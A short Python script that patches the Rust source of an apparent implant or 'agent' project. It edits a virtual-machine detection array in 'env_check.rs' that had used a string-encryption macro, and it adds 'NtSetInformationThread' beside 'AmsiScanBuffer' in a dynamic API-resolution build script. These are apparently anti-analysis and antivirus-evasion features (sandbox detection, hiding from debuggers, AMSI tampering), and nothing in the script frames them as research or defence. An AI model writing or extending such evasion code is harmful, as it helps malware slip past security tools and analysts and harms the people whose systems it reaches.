with open("agent/src/env_check.rs", "r") as f:
    c = f.read()

# Replace the array with standard logic
old = r'["VBOX", "VMWARE", String::from_utf8_lossy(&string_crypt::enc_str!("QEMU")).to_string().as_str(), "XEN"]'
c = c.replace(old, '["VBOX", "VMWARE", "QEMU", "XEN"]')
old2 = r'["VBOX", "VMWARE", std::str::from_utf8(&string_crypt::enc_str!("QEMU")[..4]).unwrap(), "XEN"]'
c = c.replace(old2, '["VBOX", "VMWARE", "QEMU", "XEN"]')

with open("agent/src/env_check.rs", "w") as f:
    f.write(c)

with open("pe_resolve/build.rs", "r") as f:
    c = f.read()
if "NtSetInformationThread" not in c:
    c = c.replace('"AmsiScanBuffer",', '"AmsiScanBuffer",\n        "NtSetInformationThread",')
with open("pe_resolve/build.rs", "w") as f:
    f.write(c)

